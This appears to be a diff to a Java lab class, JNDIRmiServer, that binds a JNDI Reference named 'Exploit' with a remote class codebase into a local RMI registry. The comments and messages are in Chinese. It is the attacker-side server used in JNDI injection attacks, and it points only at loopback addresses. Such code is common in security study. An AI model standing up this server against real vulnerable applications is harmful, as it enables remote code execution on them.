@@ -32,14 +32,10 @@ public class JNDIRmiServer {
         Reference reference = new Reference("Exploit", "Exploit","http://127.0.0.1:65500");
 
         // 将 rmi 服务与 Reference 进行绑定，提供远程服务器上的对象为客户端使用；
-        initialContext.bind("rmi:127.0.0.1:Object", reference);
+        initialContext.rebind("rmi://localhost:1099/Object", reference);
 
 
 
-
-
-        System.out.println("[+] rmi://127.0.0.1/Object" + "Jndi + RMI 服务已启动！");
+        System.out.println("[+] rmi://127.0.0.1/Object" + "   Jndi + RMI 服务已启动！");
     }
-
-
 }
